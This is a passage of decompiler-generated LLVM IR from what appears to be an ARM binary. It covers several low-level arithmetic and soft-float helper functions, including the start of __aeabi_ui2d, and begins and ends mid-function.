  %v8_213bc = icmp ne i32 %v6_213bc, %v7_213bc
  %v9_213bc = icmp ne i32 %v0_213bc, -1
  %v10_213bc = or i1 %v9_213bc, %v8_213bc
  %v11_213bc = icmp ne i32 %v0_213bc, 0
  %v12_213bc = select i1 %v2_213bc, i1 %v10_213bc, i1 %v11_213bc
  %v0_213c0 = load i32, i32* %r1.global-to-local, align 4
  %v5_213c0 = sext i1 %v12_213bc to i32
  %v6_213c0 = sub i32 %v5_213c0, %v0_213c0
  store i32 %v6_213c0, i32* @r1, align 4
  ret i32 %v6_213bc

; uselistorder directives
  uselistorder i1 %v2_213bc, { 1, 2, 0 }
  uselistorder i32 %v0_213bc, { 1, 2, 0 }
  uselistorder i32 %v8_213ac, { 1, 0 }
  uselistorder i32 %v0_213a0, { 1, 2, 3, 4, 0 }
  uselistorder i32 %v11_2138c, { 1, 0 }
  uselistorder i32 %v1_21388, { 1, 0, 2 }
  uselistorder i32 %v0_21380, { 1, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %ip.global-to-local, { 0, 2, 3, 1 }
  uselistorder label %dec_label_pc_213b0, { 1, 0 }
}

define i32 @function_213c4(i64 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_213c4:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = trunc i64 %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_213c4 = load i32, i32* %r1.global-to-local, align 4
  %v3_213c8 = icmp ult i32 %v0_213c4, 1048574
  br i1 %v3_213c8, label %dec_label_pc_2140c, label %dec_label_pc_213cc

dec_label_pc_213cc:                               ; preds = %dec_label_pc_213c4
  %v3_213d0 = icmp ult i32 %v0_213c4, 2097150
  br i1 %v3_213d0, label %dec_label_pc_213f0, label %dec_label_pc_213d4

dec_label_pc_213d4:                               ; preds = %dec_label_pc_213cc
  %v1_213d4 = urem i32 %v0_213c4, 2
  %v2_213d4 = icmp ne i32 %v1_213d4, 0
  %v3_213d4 = udiv i32 %v0_213c4, 2
  store i32 %v3_213d4, i32* %r1.global-to-local, align 4
  %v0_213d8 = load i32, i32* %r0.global-to-local, align 4
  %v3_213d8 = zext i1 %v2_213d4 to i32
  %v6_213d8 = zext i32 %v0_213d8 to i64
  %v7_213d8 = sub i32 33, %v0_213d8
  %v8_213d8 = zext i32 %v7_213d8 to i64
  %v9_213d8 = shl i64 %v6_213d8, %v8_213d8
  %v10_213d8 = sub i32 32, %v0_213d8
  %v11_213d8 = shl i32 %v3_213d8, %v10_213d8
  %v12_213d8 = zext i32 %v11_213d8 to i64
  %v14_213d8 = or i64 %v12_213d8, %v9_213d8
  %v15_213d8 = trunc i64 %v14_213d8 to i32
  %v16_213d8 = add i32 %v0_213d8, -1
  %v17_213d8 = shl i32 1, %v16_213d8
  %v18_213d8 = and i32 %v17_213d8, %v0_213d8
  %v19_213d8 = icmp ne i32 %v18_213d8, 0
  store i32 %v15_213d8, i32* %r0.global-to-local, align 4
  %v0_213dc = load i32, i32* @ip, align 4
  %v3_213dc = zext i1 %v19_213d8 to i32
  %v6_213dc = zext i32 %v0_213dc to i64
  %v7_213dc = sub i32 33, %v0_213dc
  %v8_213dc = zext i32 %v7_213dc to i64
  %v9_213dc = shl i64 %v6_213dc, %v8_213dc
  %v10_213dc = sub i32 32, %v0_213dc
  %v11_213dc = shl i32 %v3_213dc, %v10_213dc
  %v12_213dc = zext i32 %v11_213dc to i64
  %v14_213dc = or i64 %v12_213dc, %v9_213dc
  %v15_213dc = trunc i64 %v14_213dc to i32
  store i32 %v15_213dc, i32* @ip, align 4
  %v0_213e0 = load i32, i32* @r4, align 4
  %v1_213e0 = add i32 %v0_213e0, 1
  store i32 %v1_213e0, i32* @r4, align 4
  %v3_213e4 = mul i32 %v1_213e0, 2097152
  %v2_213e8 = icmp ugt i32 %v3_213e4, -4194305
  call void @__pseudo_cond_branch(i1 %v2_213e8, i32 ptrtoint (i32* @global_var_215a0.1898 to i32))
  br label %dec_label_pc_213f0

dec_label_pc_213f0:                               ; preds = %dec_label_pc_2140c, %dec_label_pc_213cc, %dec_label_pc_213d4
  %v0_213f0 = load i32, i32* @ip, align 4
  %v2_213f0 = icmp slt i32 %v0_213f0, 0
  %v6_213f0 = icmp eq i32 %v0_213f0, -2147483648
  %v1_213f4 = load i32, i32* %r0.global-to-local, align 4
  br i1 %v6_213f0, label %bb, label %dec_label_pc_213f0._crit_edge

bb:                                               ; preds = %dec_label_pc_213f0
  %v2_213f4 = urem i32 %v1_213f4, 2
  %v3_213f4 = icmp ne i32 %v2_213f4, 0
  br label %dec_label_pc_213f0._crit_edge

dec_label_pc_213f0._crit_edge:                    ; preds = %dec_label_pc_213f0, %bb
  %v1_213f8 = phi i1 [ %v3_213f4, %bb ], [ %v2_213f0, %dec_label_pc_213f0 ]
  %v2_213f8 = zext i1 %v1_213f8 to i32
  %v3_213f8 = add i32 %v2_213f8, %v1_213f4
  store i32 %v3_213f8, i32* %r0.global-to-local, align 4
  %v0_213fc = load i32, i32* %r1.global-to-local, align 4
  %v1_213fc = load i32, i32* @r4, align 4
  %v2_213fc = and i32 %v1_213fc, 4096
  %v3_213fc = icmp ne i32 %v2_213fc, 0
  %v4_213fc = mul i32 %v1_213fc, 1048576
  %v6_213fc = add i32 %v4_213fc, %v0_213fc
  %v7_213fc = zext i1 %v3_213fc to i32
  %v8_213fc = add i32 %v7_213fc, %v6_213fc
  %v1_21400 = load i32, i32* @r5, align 4
  %v2_21400 = or i32 %v1_21400, %v8_213fc
  store i32 %v2_21400, i32* %r1.global-to-local, align 4
  ret i32 %v3_213f8

dec_label_pc_2140c:                               ; preds = %dec_label_pc_213c4
  %v0_2140c = load i32, i32* @ip, align 4
  %v1_2140c = icmp slt i32 %v0_2140c, 0
  %v2_2140c = mul i32 %v0_2140c, 2
  store i32 %v2_2140c, i32* @ip, align 4
  %v0_21410 = load i32, i32* %r0.global-to-local, align 4
  %v3_21410 = mul i32 %v0_21410, 2
  %v4_21410 = zext i1 %v1_2140c to i32
  %v5_21410 = or i32 %v3_21410, %v4_21410
  store i32 %v5_21410, i32* %r0.global-to-local, align 4
  %v9_21410 = icmp ule i32 %v5_21410, %v0_21410
  %v10_21410 = icmp ult i32 %v3_21410, %v0_21410
  %v11_21410 = select i1 %v1_2140c, i1 %v9_21410, i1 %v10_21410
  %v3_21414 = mul i32 %v0_213c4, 2
  %v4_21414 = zext i1 %v11_21410 to i32
  %v5_21414 = or i32 %v4_21414, %v3_21414
  store i32 %v5_21414, i32* %r1.global-to-local, align 4
  %v1_21418 = and i32 %v3_21414, 1048576
  %v2_21418 = icmp eq i32 %v1_21418, 0
  %v0_2141c = load i32, i32* @r4, align 4
  %v1_2141c = add i32 %v0_2141c, -1
  store i32 %v1_2141c, i32* @r4, align 4
  br i1 %v2_21418, label %bb7, label %dec_label_pc_213f0

bb7:                                              ; preds = %dec_label_pc_2140c
  ret i32 %v5_21410

; uselistorder directives
  uselistorder i32 %v0_21410, { 1, 2, 0 }
  uselistorder i1 %v1_2140c, { 1, 0 }
  uselistorder i32 %v1_213f4, { 1, 0 }
  uselistorder i32 %v0_213f0, { 1, 0 }
  uselistorder i32 %v0_213dc, { 1, 0, 2 }
  uselistorder i32 %v0_213d8, { 0, 3, 2, 1, 4 }
  uselistorder i32* %r1.global-to-local, { 2, 3, 4, 5, 0, 1 }
  uselistorder i32* %r0.global-to-local, { 3, 0, 4, 5, 6, 1, 2 }
  uselistorder label %dec_label_pc_213f0._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_213f0, { 0, 2, 1 }
}

define i32 @function_21424() local_unnamed_addr {
dec_label_pc_21424:
  %r1.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %stack_var_12 = alloca i32, align 4
  %v0_21424 = load i32, i32* @r1, align 4
  %v2_21424 = icmp eq i32 %v0_21424, 0
  br i1 %v2_21424, label %bb38, label %bb

bb:                                               ; preds = %dec_label_pc_21424
  br label %.thread

bb38:                                             ; preds = %dec_label_pc_21424
  %v1_2143010 = load i32, i32* @r0, align 4
  store i32 %v1_2143010, i32* %r1.global-to-local, align 4
  store i32 0, i32* @r0, align 4
  br label %.thread

.thread:                                          ; preds = %bb, %bb38
  %v0_2148c = phi i32 [ %v0_21424, %bb ], [ %v1_2143010, %bb38 ]
  %v1_21444 = phi i32 [ 20, %bb ], [ 52, %bb38 ]
  %v2_2143c = icmp ugt i32 %v0_2148c, 65535
  br i1 %v2_2143c, label %bb39, label %.thread3

bb39:                                             ; preds = %.thread
  %v2_21440 = and i32 %v0_2148c, 32768
  %v3_21440 = icmp eq i32 %v2_21440, 0
  %v4_21440 = udiv i32 %v0_2148c, 65536
  br i1 %v3_21440, label %.thread3, label %bb40

bb40:                                             ; preds = %bb39
  %v2_21444 = add nsw i32 %v1_21444, -16
  br label %.thread3

.thread3:                                         ; preds = %bb39, %.thread, %bb40
  %v1_21450 = phi i32 [ %v1_21444, %.thread ], [ %v1_21444, %bb39 ], [ %v2_21444, %bb40 ]
  %v1_2144c = phi i32 [ %v0_2148c, %.thread ], [ %v4_21440, %bb39 ], [ %v4_21440, %bb40 ]
  %v2_21448 = icmp ugt i32 %v1_2144c, 255
  br i1 %v2_21448, label %bb41, label %.thread4

bb41:                                             ; preds = %.thread3
  %v2_2144c = and i32 %v1_2144c, 128
  %v3_2144c = icmp eq i32 %v2_2144c, 0
  %v4_2144c = udiv i32 %v1_2144c, 256
  br i1 %v3_2144c, label %.thread4, label %bb42

bb42:                                             ; preds = %bb41
  %v2_21450 = add nsw i32 %v1_21450, -8
  br label %.thread4

.thread4:                                         ; preds = %bb41, %.thread3, %bb42
  %v1_2145c = phi i32 [ %v1_21450, %.thread3 ], [ %v1_21450, %bb41 ], [ %v2_21450, %bb42 ]
  %v1_21458 = phi i32 [ %v1_2144c, %.thread3 ], [ %v4_2144c, %bb41 ], [ %v4_2144c, %bb42 ]
  %v2_21454 = icmp ugt i32 %v1_21458, 15
  br i1 %v2_21454, label %bb43, label %.thread5

bb43:                                             ; preds = %.thread4
  %v2_21458 = and i32 %v1_21458, 8
  %v3_21458 = icmp eq i32 %v2_21458, 0
  %v4_21458 = udiv i32 %v1_21458, 16
  br i1 %v3_21458, label %.thread5, label %bb44

bb44:                                             ; preds = %bb43
  %v2_2145c = add nsw i32 %v1_2145c, -4
  br label %.thread5

.thread5:                                         ; preds = %bb43, %.thread4, %bb44
  %v1_21464 = phi i32 [ %v1_2145c, %.thread4 ], [ %v1_2145c, %bb43 ], [ %v2_2145c, %bb44 ]
  %v1_2146c = phi i32 [ %v1_21458, %.thread4 ], [ %v4_21458, %bb43 ], [ %v4_21458, %bb44 ]
  %v2_21460 = icmp ugt i32 %v1_2146c, 3
  br i1 %v2_21460, label %bb45, label %.thread6

bb45:                                             ; preds = %.thread5
  %v2_21464 = add i32 %v1_21464, -2
  br label %bb46

.thread6:                                         ; preds = %.thread5
  %v5_21468 = udiv i32 %v1_2146c, 2
  %v6_21468 = sub i32 %v1_21464, %v5_21468
  br label %bb46

bb46:                                             ; preds = %bb45, %.thread6
  %v0_2146c = phi i32 [ %v6_21468, %.thread6 ], [ %v2_21464, %bb45 ]
  %v4_2146c = udiv i32 %v1_2146c, 8
  %v5_2146c = sub i32 %v0_2146c, %v4_2146c
  %v2_21470 = add i32 %v5_2146c, -32
  %v4_21470 = sub i32 31, %v5_2146c
  %v5_21470 = and i32 %v4_21470, %v5_2146c
  %v8_21470 = icmp eq i32 %v5_2146c, 32
  %v6_21474 = icmp slt i32 %v5_2146c, 32
  br i1 %v6_21474, label %dec_label_pc_21478, label %dec_label_pc_21498

dec_label_pc_21478:                               ; preds = %bb46
  %v2_21478 = add i32 %v5_2146c, -20
  %v7_2147c = icmp sgt i32 %v2_21470, -12
  br i1 %v7_2147c, label %dec_label_pc_21480, label %dec_label_pc_21494

dec_label_pc_21480:                               ; preds = %dec_label_pc_21478
  %v1_21484 = sub i32 32, %v5_2146c
  %v6_21488 = shl i32 %v0_2148c, %v5_2146c
  store i32 %v6_21488, i32* @r0, align 4
  %v6_2148c = lshr i32 %v0_2148c, %v1_21484
  store i32 %v6_2148c, i32* %r1.global-to-local, align 4
  br label %.thread31

dec_label_pc_21494:                               ; preds = %dec_label_pc_21478
  %v8_21478 = icmp eq i32 %v2_21478, 0
  %v4_21478 = add i32 %v5_2146c, 2147483616
  %v5_21478 = and i32 %v2_21478, %v4_21478
  br label %dec_label_pc_21498

dec_label_pc_21498:                               ; preds = %bb46, %dec_label_pc_21494
  %v1_214a4.in = phi i32 [ %v2_21470, %bb46 ], [ %v2_21478, %dec_label_pc_21494 ]
  %v6_214a4 = phi i32 [ %v2_21470, %bb46 ], [ %v5_2146c, %dec_label_pc_21494 ]
  %v2_214a4.in = phi i32 [ %v5_21470, %bb46 ], [ %v5_21478, %dec_label_pc_21494 ]
  %v0_214a4 = phi i1 [ %v8_21470, %bb46 ], [ %v8_21478, %dec_label_pc_21494 ]
  %v1_214a4 = icmp slt i32 %v1_214a4.in, 0
  %v2_214a4 = icmp slt i32 %v2_214a4.in, 0
  %v3_21498 = xor i1 %v2_214a4, %v1_214a4
  %v4_21498 = or i1 %v0_214a4, %v3_21498
  br i1 %v4_21498, label %bb47, label %bb48

bb47:                                             ; preds = %dec_label_pc_21498
  %v6_21498 = sub i32 32, %v6_214a4
  store i32 %v6_21498, i32* @ip, align 4
  br label %bb48

bb48:                                             ; preds = %dec_label_pc_21498, %bb47
  %v6_2149c = shl i32 %v0_2148c, %v6_214a4
  store i32 %v6_2149c, i32* %r1.global-to-local, align 4
  br i1 %v4_21498, label %bb49, label %.thread31

bb49:                                             ; preds = %bb48
  %v6_214a0 = load i32, i32* @r0, align 4
  %v7_214a0 = load i32, i32* @ip, align 4
  %v12_214a0 = lshr i32 %v6_214a0, %v7_214a0
  %v13_214a0 = or i32 %v12_214a0, %v6_2149c
  store i32 %v13_214a0, i32* %r1.global-to-local, align 4
  %v11_214a4 = shl i32 %v6_214a0, %v6_214a4
  store i32 %v11_214a4, i32* @r0, align 4
  br label %.thread31

.thread31:                                        ; preds = %bb48, %dec_label_pc_21480, %bb49
  %v6_214ac = phi i32 [ %v6_2148c, %dec_label_pc_21480 ], [ %v13_214a0, %bb49 ], [ %v6_2149c, %bb48 ]
  %v0_214a8 = load i32, i32* @r4, align 4
  %v2_214a8 = sub i32 %v0_214a8, %v5_2146c
  store i32 %v2_214a8, i32* %r4.global-to-local, align 4
  %v4_214a8 = xor i32 %v0_214a8, %v5_2146c
  %v5_214a8 = xor i32 %v2_214a8, %v0_214a8
  %v6_214a8 = and i32 %v5_214a8, %v4_214a8
  %v7_214a8 = icmp slt i32 %v6_214a8, 0
  %v8_214a8 = icmp slt i32 %v2_214a8, 0
  %v5_214ac = icmp slt i32 %v0_214a8, %v5_2146c
  br i1 %v5_214ac, label %.thread8, label %bb50

bb50:                                             ; preds = %.thread31
  %v10_214ac = mul i32 %v2_214a8, 1048576
  %v11_214ac = add i32 %v10_214ac, %v6_214ac
  %v7_214b0 = load i32, i32* @r5, align 4
  %v8_214b0 = or i32 %v7_214b0, %v11_214ac
  store i32 %v8_214b0, i32* %r1.global-to-local, align 4
  br label %.thread8

.thread8:                                         ; preds = %.thread31, %bb50
  %v3_214b8 = xor i1 %v8_214a8, %v7_214a8
  %v4_214b8 = xor i1 %v3_214b8, true
  call void @__pseudo_cond_branch(i1 %v4_214b8, i32 %tmp33)
  %v0_214bc = load i32, i32* %r4.global-to-local, align 4
  %v2_214c0 = sub i32 -32, %v0_214bc
  store i32 %v2_214c0, i32* %r4.global-to-local, align 4
  %v6_214c4 = icmp sgt i32 %v0_214bc, -32
  br i1 %v6_214c4, label %dec_label_pc_214c8, label %dec_label_pc_21508

dec_label_pc_214c8:                               ; preds = %.thread8
  %v1_214c8 = add i32 %v2_214c0, 12
  store i32 %v1_214c8, i32* %r4.global-to-local, align 4
  %v8_214cc = icmp sgt i32 %v1_214c8, 0
  br i1 %v8_214cc, label %dec_label_pc_214ec, label %dec_label_pc_214d0

dec_label_pc_214d0:                               ; preds = %dec_label_pc_214c8
  %v1_214d0 = add i32 %v2_214c0, 32
  %v1_214d4 = sub i32 0, %v2_214c0
  %v0_214d8 = load i32, i32* @r0, align 4
  %v6_214d8 = lshr i32 %v0_214d8, %v1_214d0
  %v1_214dc = load i32, i32* %r1.global-to-local, align 4
  %v7_214dc = shl i32 %v1_214dc, %v1_214d4
  %v8_214dc = or i32 %v7_214dc, %v6_214d8
  %v0_214e0 = load i32, i32* @r5, align 4
  %v7_214e0 = lshr i32 %v1_214dc, %v1_214d0
  %v8_214e0 = or i32 %v0_214e0, %v7_214e0
  store i32 %v8_214e0, i32* %r1.global-to-local, align 4
  %v2_214e4 = load i32, i32* %stack_var_12, align 4
  store i32 %v2_214e4, i32* %r4.global-to-local, align 4
  ret i32 %v8_214dc

dec_label_pc_214ec:                               ; preds = %dec_label_pc_214c8
  %v1_214ec = sub i32 0, %v2_214c0
  %v1_214f0 = add i32 %v2_214c0, 32
  %v0_214f4 = load i32, i32* @r0, align 4
  %v6_214f4 = lshr i32 %v0_214f4, %v1_214f0
  %v1_214f8 = load i32, i32* %r1.global-to-local, align 4
  %v7_214f8 = shl i32 %v1_214f8, %v1_214ec
  %v8_214f8 = or i32 %v7_214f8, %v6_214f4
  %v0_214fc = load i32, i32* @r5, align 4
  store i32 %v0_214fc, i32* %r1.global-to-local, align 4
  %v2_21500 = load i32, i32* %stack_var_12, align 4
  store i32 %v2_21500, i32* %r4.global-to-local, align 4
  ret i32 %v8_214f8

dec_label_pc_21508:                               ; preds = %.thread8
  %v0_21508 = load i32, i32* %r1.global-to-local, align 4
  %v6_21508 = lshr i32 %v0_21508, %v2_214c0
  %v0_2150c = load i32, i32* @r5, align 4
  store i32 %v0_2150c, i32* %r1.global-to-local, align 4
  %v2_21510 = load i32, i32* %stack_var_12, align 4
  store i32 %v2_21510, i32* %r4.global-to-local, align 4
  ret i32 %v6_21508

; uselistorder directives
  uselistorder i32 %v2_214c0, { 5, 0, 1, 2, 3, 4, 6 }
  uselistorder i32 %v2_214a8, { 1, 2, 0, 3 }
  uselistorder i32 %v0_214a8, { 2, 0, 1, 3 }
  uselistorder i32 %v6_2149c, { 1, 0, 2 }
  uselistorder i32 %v2_21470, { 1, 0, 2 }
  uselistorder i32 %v5_2146c, { 6, 0, 5, 7, 3, 8, 2, 4, 9, 10, 1, 12, 11 }
  uselistorder i32 %v4_21458, { 1, 0 }
  uselistorder i32 %v1_21458, { 1, 0, 2, 3 }
  uselistorder i32 %v4_2144c, { 1, 0 }
  uselistorder i32 %v1_2144c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_21440, { 1, 0 }
  uselistorder i32 %v0_2148c, { 3, 1, 2, 4, 0, 5, 6 }
  uselistorder i32* %r1.global-to-local, { 1, 9, 2, 7, 3, 8, 4, 5, 6, 10, 0 }
  uselistorder i32 -12, { 3, 2, 1, 9, 8, 7, 6, 5, 10, 11, 12, 13, 4, 14, 16, 17, 15, 0 }
  uselistorder i32 -20, { 1, 4, 2, 5, 0, 3 }
  uselistorder i32 -4, { 7, 2, 8, 37, 38, 39, 40, 41, 42, 0, 1, 36, 9, 43, 10, 17, 16, 60, 61, 62, 15, 14, 13, 12, 18, 19, 20, 21, 22, 5, 23, 3, 24, 4, 63, 11, 25, 33, 34, 35, 26, 27, 48, 49, 50, 6, 51, 52, 53, 28, 47, 54, 55, 56, 57, 58, 59, 29, 44, 45, 46, 30, 31, 32 }
  uselistorder i32 -8, { 13, 14, 1, 36, 15, 16, 17, 37, 23, 22, 12, 21, 20, 19, 18, 24, 25, 26, 27, 28, 40, 41, 29, 30, 42, 31, 43, 35, 32, 33, 34, 2, 38, 39, 3, 4, 5, 6, 7, 8, 9, 10, 11, 0 }
  uselistorder i32 255, { 8, 9, 5, 12, 13, 4, 6, 7, 11, 0, 1, 2, 3, 14, 10 }
  uselistorder i32 -16, { 2, 14, 6, 5, 4, 1, 7, 8, 9, 10, 11, 12, 3, 0, 13 }
  uselistorder i32 65535, { 4, 5, 2, 1, 3, 6, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread31, { 2, 0, 1 }
  uselistorder label %bb48, { 1, 0 }
  uselistorder label %dec_label_pc_21498, { 1, 0 }
  uselistorder label %bb46, { 1, 0 }
  uselistorder label %.thread5, { 2, 0, 1 }
  uselistorder label %.thread4, { 2, 0, 1 }
  uselistorder label %.thread3, { 2, 0, 1 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @function_21518(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
dec_label_pc_21518:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* @r2, align 4
  store i32 %arg1, i32* @r1, align 4
  %v0_21518 = load i32, i32* @r4, align 4
  %v2_21518 = icmp eq i32 %v0_21518, 0
  %v1_2151c = xor i32 %arg3, 1048576
  store i32 %v1_2151c, i32* @r3, align 4
  br i1 %v2_21518, label %.thread, label %.thread1

.thread:                                          ; preds = %dec_label_pc_21518
  %v1_21520 = load i32, i32* @r1, align 4
  %v2_21520 = xor i32 %v1_21520, 1048576
  store i32 %v2_21520, i32* @r1, align 4
  store i32 1, i32* @r4, align 4
  br label %bb

.thread1:                                         ; preds = %dec_label_pc_21518
  %v1_21528 = load i32, i32* @r5, align 4
  %v2_21528 = add i32 %v1_21528, -1
  store i32 %v2_21528, i32* @r5, align 4
  br label %bb

bb:                                               ; preds = %.thread, %.thread1
  %v0_2152c = call i32 @function_21370()
  store i32 %v0_2152c, i32* %r0.global-to-local, align 4
  %v0_21530 = load i32, i32* @r4, align 4
  %v0_21530.off = add i32 %v0_21530, 4194303
  %tmp = icmp ult i32 %v0_21530.off, 2097152
  %v1_215c0 = load i32, i32* @r5, align 4
  %v1_215c0.off = add i32 %v1_215c0, 4194303
  %tmp44 = icmp ult i32 %v1_215c0.off, 2097152
  br i1 %tmp, label %.thread11, label %bb30

bb30:                                             ; preds = %bb
  br i1 %tmp44, label %bb37, label %dec_label_pc_2153c

dec_label_pc_2153c:                               ; preds = %bb30
  %v4_2153c = icmp eq i32 %v1_215c0, %v0_21530
  br i1 %v4_2153c, label %bb31, label %dec_label_pc_21548

bb31:                                             ; preds = %dec_label_pc_2153c
  %v2_21540 = load i32, i32* @r2, align 4
  %v5_21540 = icmp eq i32 %v2_21540, %v0_2152c
  br i1 %v5_21540, label %dec_label_pc_2155c, label %dec_label_pc_21548

dec_label_pc_21548:                               ; preds = %dec_label_pc_2153c, %bb31
  %v2_21548 = or i32 %v0_21530, %v0_2152c
  %v4_21548 = icmp eq i32 %v2_21548, 0
  br i1 %v4_21548, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_21548
  %v1_21550 = load i32, i32* @r2, align 4
  store i32 %v1_21550, i32* %r0.global-to-local, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_21548, %bb32
  %v1_21558 = phi i32 [ %v0_2152c, %dec_label_pc_21548 ], [ %v1_21550, %bb32 ]
  ret i32 %v1_21558

dec_label_pc_2155c:                               ; preds = %bb31
  %v0_2155c = load i32, i32* @r1, align 4
  %v1_2155c = load i32, i32* @r3, align 4
  %v4_2155c = icmp eq i32 %v1_2155c, %v0_2155c
  br i1 %v4_2155c, label %dec_label_pc_2155c..thread8_crit_edge, label %bb33

dec_label_pc_2155c..thread8_crit_edge:            ; preds = %dec_label_pc_2155c
  %v0_2156c.pre = load i32, i32* @lr, align 4
  br label %.thread8

bb33:                                             ; preds = %dec_label_pc_2155c
  store i32 0, i32* @r1, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %arg4, i32* @r4, align 4
  store i32 %arg6, i32* @lr, align 4
  br label %.thread8

.thread8:                                         ; preds = %dec_label_pc_2155c..thread8_crit_edge, %bb33
  %v0_2156c = phi i32 [ %v0_2156c.pre, %dec_label_pc_2155c..thread8_crit_edge ], [ %arg6, %bb33 ]
  %v2_2156c = xor i1 %v4_2155c, true
  call void @__pseudo_cond_branch(i1 %v2_2156c, i32 %v0_2156c)
  %v0_21570 = load i32, i32* @r4, align 4
  %tmp45 = icmp ult i32 %v0_21570, 2097152
  br i1 %tmp45, label %dec_label_pc_21578, label %dec_label_pc_2158c

dec_label_pc_21578:                               ; preds = %.thread8
  %v0_21578 = load i32, i32* %r0.global-to-local, align 4
  %v1_21578 = icmp slt i32 %v0_21578, 0
  %v2_21578 = mul i32 %v0_21578, 2
  store i32 %v2_21578, i32* %r0.global-to-local, align 4
  %v0_2157c = load i32, i32* @r1, align 4
  %v3_2157c = mul i32 %v0_2157c, 2
  %v4_2157c = zext i1 %v1_21578 to i32
  %v5_2157c = or i32 %v3_2157c, %v4_2157c
  %v9_2157c = icmp ule i32 %v5_2157c, %v0_2157c
  %v10_2157c = icmp ult i32 %v3_2157c, %v0_2157c
  %v11_2157c = select i1 %v1_21578, i1 %v9_2157c, i1 %v10_2157c
  br i1 %v11_2157c, label %bb34, label %bb35

bb34:                                             ; preds = %dec_label_pc_21578
  br label %bb35

bb35:                                             ; preds = %dec_label_pc_21578, %bb34
  ret i32 %v2_21578

dec_label_pc_2158c:                               ; preds = %.thread8
  %v2_2158c = icmp ugt i32 %v0_21570, -4194305
  br i1 %v2_2158c, label %dec_label_pc_2158c..thread9_crit_edge, label %bb36

dec_label_pc_2158c..thread9_crit_edge:            ; preds = %dec_label_pc_2158c
  %v0_21598.pre = load i32, i32* @lr, align 4
  br label %.thread9

bb36:                                             ; preds = %dec_label_pc_2158c
  %v1_21590 = load i32, i32* @r1, align 4
  %v2_21590 = add i32 %v1_21590, 1048576
  store i32 %v2_21590, i32* @r1, align 4
  br label %.thread9

.thread9:                                         ; preds = %dec_label_pc_2158c..thread9_crit_edge, %bb36
  %v0_21598 = phi i32 [ %v0_21598.pre, %dec_label_pc_2158c..thread9_crit_edge ], [ %arg9, %bb36 ]
  %v2_21598 = xor i1 %v2_2158c, true
  call void @__pseudo_cond_branch(i1 %v2_21598, i32 %v0_21598)
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

.thread11:                                        ; preds = %bb
  %v1_215cc.pre = load i32, i32* @r1, align 4
  br i1 %tmp44, label %.thread13, label %.thread14

.thread14:                                        ; preds = %.thread11
  store i32 %v1_215cc.pre, i32* @r3, align 4
  br label %bb38

bb37:                                             ; preds = %bb30
  %v1_215b8 = load i32, i32* @r3, align 4
  %v1_215bc = load i32, i32* @r2, align 4
  store i32 %v1_215bc, i32* %r0.global-to-local, align 4
  br label %bb38

bb38:                                             ; preds = %bb37, %.thread14
  %v1_215cc23 = phi i32 [ %v1_215cc.pre, %.thread14 ], [ %v1_215b8, %bb37 ]
  %v1_215c8 = phi i32 [ %v0_2152c, %.thread14 ], [ %v1_215bc, %bb37 ]
  store i32 %v1_215c8, i32* @r2, align 4
  br label %.thread13

.thread13:                                        ; preds = %.thread11, %bb38
  %v1_215d8 = phi i32 [ %v1_215cc23, %bb38 ], [ %v1_215cc.pre, %.thread11 ]
  %v1_215e0 = phi i32 [ %v1_215c8, %bb38 ], [ %v0_2152c, %.thread11 ]
  %v4_215cc = mul i32 %v1_215d8, 4096
  %v5_215cc = or i32 %v4_215cc, %v1_215e0
  %v7_215cc = icmp eq i32 %v5_215cc, 0
  br i1 %v7_215cc, label %bb39, label %.thread17

bb39:                                             ; preds = %.thread13
  %v1_215d0 = load i32, i32* @r2, align 4
  %v2_215d0 = load i32, i32* @r3, align 4
  %v5_215d0 = mul i32 %v2_215d0, 4096
  %v6_215d0 = or i32 %v5_215d0, %v1_215d0
  %v8_215d0 = icmp eq i32 %v6_215d0, 0
  br i1 %v8_215d0, label %bb40, label %.thread17

bb40:                                             ; preds = %bb39
  %v5_215d4 = icmp eq i32 %v2_215d0, %v1_215d8
  br i1 %v5_215d4, label %bb41, label %.thread17

.thread17:                                        ; preds = %.thread13, %bb39, %bb40
  br label %bb41

bb41:                                             ; preds = %bb40, %.thread17
  ret i32 %v1_215e0

; uselistorder directives
  uselistorder i32 %v1_215cc.pre, { 0, 2, 1 }
  uselistorder i32 %v0_2157c, { 1, 2, 0 }
  uselistorder i32 %v2_21578, { 1, 0 }
  uselistorder i1 %v1_21578, { 1, 0 }
  uselistorder i32 %v0_21570, { 1, 0 }
  uselistorder i1 %v4_2155c, { 1, 0 }
  uselistorder i32 %v0_21530, { 2, 0, 1 }
  uselistorder i32 %v0_2152c, { 2, 3, 4, 1, 0, 5 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 0 }
  uselistorder label %bb41, { 1, 0 }
  uselistorder label %.thread17, { 2, 1, 0 }
  uselistorder label %.thread13, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %bb35, { 1, 0 }
  uselistorder label %.thread8, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %dec_label_pc_21548, { 1, 0 }
  uselistorder label %bb, { 1, 0 }
}

define i32 @__aeabi_ui2d(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v2_215e4 = icmp eq i32 %arg1, 0
  br i1 %v2_215e4, label %bb, label %bb3

bb:                                               ; preds = %entry
  br label %bb3

bb3:                                              ; preds = %entry, %bb
  %v0_215ec = load i32, i32* @lr, align 4
